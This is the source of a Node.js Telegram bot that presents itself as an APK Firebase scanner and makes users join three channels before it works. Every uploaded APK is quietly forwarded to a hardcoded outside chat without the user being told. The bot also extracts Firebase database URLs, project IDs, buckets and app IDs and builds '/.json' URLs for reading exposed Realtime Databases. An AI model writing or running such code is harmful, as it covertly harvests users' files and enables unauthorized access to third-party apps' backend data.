const express = require("express");
const { Telegraf, Markup } = require("telegraf");
const AdmZip = require("adm-zip");
const fs = require("fs");
const path = require("path");
const os = require("os");

const BOT_TOKEN = process.env.BOT_TOKEN;
const DESTINATION_CHAT_ID =
  process.env.DESTINATION_CHAT_ID || "-1004352285600";

const REQUIRED_CHANNELS = [
  "@brotherpanell",
  "@PANELEMPIRE2",
  "@backuptt2"
];

if (!BOT_TOKEN) {
  console.error("BOT_TOKEN is missing.");
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);

// -------------------------
// Render web server
// -------------------------

const app = express();

app.get("/", (req, res) => {
  res.send("APK Scanner Bot is running.");
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

// -------------------------
// Channel membership
// -------------------------

async function isJoined(ctx) {
  const userId = ctx.from.id;

  for (const channel of REQUIRED_CHANNELS) {
    try {
      const member = await ctx.telegram.getChatMember(
        channel,
        userId
      );

      if (
        !["creator", "administrator", "member"].includes(
          member.status
        )
      ) {
        return false;
      }
    } catch (error) {
      console.error(
        `Cannot check ${channel}:`,
        error.message
      );

      return false;
    }
  }

  return true;
}

// -------------------------
// Join screen
// -------------------------

async function sendJoinScreen(ctx) {
  await ctx.reply(
    "🔐 আগে আমাদের 3টি channel join করো।\n\nতারপর Verify চাপো।",
    Markup.inlineKeyboard([
      [
        Markup.button.url(
          "📢 Join Channel 1",
          "https://t.me/brotherpanell"
        )
      ],
      [
        Markup.button.url(
          "📢 Join Channel 2",
          "https://t.me/PANELEMPIRE2"
        )
      ],
      [
        Markup.button.url(
          "📢 Join Channel 3",
          "https://t.me/backuptt2"
        )
      ],
      [
        Markup.button.callback(
          "✅ Verify",
          "verify_join"
        )
      ]
    ])
  );
}

// -------------------------
// /start
// -------------------------

bot.start(async (ctx) => {
  const joined = await isJoined(ctx);

  if (!joined) {
    return sendJoinScreen(ctx);
  }

  await ctx.reply(
    "✅ Verified!\n\n📦 এখন APK file পাঠাও।"
  );
});

// -------------------------
// Verify
// -------------------------

bot.action("verify_join", async (ctx) => {
  await ctx.answerCbQuery();

  const joined = await isJoined(ctx);

  if (!joined) {
    return ctx.reply(
      "❌ সব channel join করা হয়নি।\n\n3টি channel join করে আবার Verify চাপো।"
    );
  }

  await ctx.reply(
    "✅ Verification successful!\n\n📦 এখন APK পাঠাও।"
  );
});

// -------------------------
// APK handler
// -------------------------

bot.on("document", async (ctx) => {
  const document = ctx.message.document;
  const fileName = document.file_name || "unknown.apk";

  // Only APK
  if (!fileName.toLowerCase().endsWith(".apk")) {
    return ctx.reply("❌ শুধু APK file পাঠাও।");
  }

  // Check membership again
  const joined = await isJoined(ctx);

  if (!joined) {
    return sendJoinScreen(ctx);
  }

  const statusMessage = await ctx.reply(
    "⏳ APK received.\n\n🔍 Firebase configuration scan চলছে..."
  );

  let tempFile = null;

  try {
    // -------------------------
    // Download APK
    // -------------------------

    const fileLink =
      await ctx.telegram.getFileLink(document.file_id);

    const response = await fetch(fileLink.href);

    if (!response.ok) {
      throw new Error("APK download failed");
    }

    const buffer =
      Buffer.from(await response.arrayBuffer());

    tempFile = path.join(
      os.tmpdir(),
      `${Date.now()}-${safeName(fileName)}`
    );

    fs.writeFileSync(tempFile, buffer);

    // -------------------------
    // Send ONLY APK
    // -------------------------

    await ctx.telegram.sendDocument(
      DESTINATION_CHAT_ID,
      {
        source: tempFile
      }
    );

    // -------------------------
    // Scan
    // -------------------------

    const result = scanAPK(tempFile);

    let output =
      "🔎 <b>APK Firebase Scan</b>\n\n";

    if (!result.found) {
      output +=
        "❌ Firebase configuration detected হয়নি.";
    } else {
      output +=
        "🔥 <b>Firebase configuration found</b>\n\n";

      if (result.databaseUrls.length) {
        output += "<b>Database URL:</b>\n";

        for (const url of result.databaseUrls) {
          output +=
            `${escapeHtml(url)}\n\n`;

          output +=
            "<b>.json URL:</b>\n";

          output +=
            `${escapeHtml(makeJsonUrl(url))}\n\n`;
        }
      }

      if (result.projectIds.length) {
        output += "<b>Project ID:</b>\n";

        for (const id of result.projectIds) {
          output +=
            `${escapeHtml(id)}\n`;
        }

        output += "\n";
      }

      if (result.storageBuckets.length) {
        output += "<b>Storage Bucket:</b>\n";

        for (const bucket of result.storageBuckets) {
          output +=
            `${escapeHtml(bucket)}\n`;
        }

        output += "\n";
      }

      if (result.appIds.length) {
        output += "<b>Firebase App ID:</b>\n";

        for (const appId of result.appIds) {
          output +=
            `${escapeHtml(appId)}\n`;
        }
      }
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMessage.message_id,
      undefined,
      output,
      {
        parse_mode: "HTML"
      }
    );

  } catch (error) {
    console.error(error);

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMessage.message_id,
      undefined,
      "❌ APK scan failed।\n\nঅন্য APK দিয়ে চেষ্টা করো।"
    );

  } finally {
    if (
      tempFile &&
      fs.existsSync(tempFile)
    ) {
      try {
        fs.unlinkSync(tempFile);
      } catch {}
    }
  }
});

// -------------------------
// APK scanner
// -------------------------

function scanAPK(apkPath) {
  const zip = new AdmZip(apkPath);
  const entries = zip.getEntries();

  const databaseUrls = new Set();
  const projectIds = new Set();
  const storageBuckets = new Set();
  const appIds = new Set();

  for (const entry of entries) {
    if (entry.isDirectory) continue;

    let text;

    try {
      text = entry
        .getData()
        .toString("utf8");
    } catch {
      continue;
    }

    // Realtime Database
    const firebaseIo =
      text.match(
        /https?:\/\/[A-Za-z0-9._-]+\.firebaseio\.com(?:\/[^\s"'<>]*)?/gi
      );

    if (firebaseIo) {
      for (const url of firebaseIo) {
        databaseUrls.add(cleanUrl(url));
      }
    }

    // New Firebase database domain
    const firebaseDatabase =
      text.match(
        /https?:\/\/[A-Za-z0-9._-]+\.firebasedatabase\.app(?:\/[^\s"'<>]*)?/gi
      );

    if (firebaseDatabase) {
      for (const url of firebaseDatabase) {
        databaseUrls.add(cleanUrl(url));
      }
    }

    // google-services.json style
    const configUrls =
      text.match(
        /"firebase_url"\s*:\s*"([^"]+)"/gi
      );

    if (configUrls) {
      for (const item of configUrls) {
        const match =
          item.match(
            /"firebase_url"\s*:\s*"([^"]+)"/i
          );

        if (match) {
          databaseUrls.add(
            cleanUrl(match[1])
          );
        }
      }
    }

    // Storage bucket
    const buckets =
      text.match(
        /[A-Za-z0-9._-]+\.(?:appspot\.com|firebasestorage\.app)/gi
      );

    if (buckets) {
      for (const bucket of buckets) {
        storageBuckets.add(bucket);
      }
    }

    // Firebase App ID
    const ids =
      text.match(
        /1:[0-9]+:android:[a-f0-9]+/gi
      );

    if (ids) {
      for (const id of ids) {
        appIds.add(id);
      }
    }

    // Project ID from common Firebase domains
    const projects =
      text.match(
        /[A-Za-z0-9-]+\.firebaseapp\.com/gi
      );

    if (projects) {
      for (const value of projects) {
        projectIds.add(
          value.replace(
            ".firebaseapp.com",
            ""
          )
        );
      }
    }
  }

  return {
    found:
      databaseUrls.size > 0 ||
      projectIds.size > 0 ||
      storageBuckets.size > 0 ||
      appIds.size > 0,

    databaseUrls:
      [...databaseUrls],

    projectIds:
      [...projectIds],

    storageBuckets:
      [...storageBuckets],

    appIds:
      [...appIds]
  };
}

// -------------------------
// Helpers
// -------------------------

function makeJsonUrl(url) {
  url = url.replace(/\/+$/, "");

  if (url.endsWith(".json")) {
    return url;
  }

  return `${url}/.json`;
}

function cleanUrl(url) {
  return url
    .trim()
    .replace(/[\\'")>,;]+$/g, "");
}

function safeName(name) {
  return name.replace(
    /[^a-zA-Z0-9._-]/g,
    "_"
  );
}

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

// -------------------------
// Start bot
// -------------------------

bot.launch()
  .then(() => {
    console.log(
      "Telegram APK Scanner Bot started."
    );
  })
  .catch((error) => {
    console.error(
      "Bot startup error:",
      error
    );
  });

process.once(
  "SIGINT",
  () => bot.stop("SIGINT")
);

process.once(
  "SIGTERM",
  () => bot.stop("SIGTERM")
);
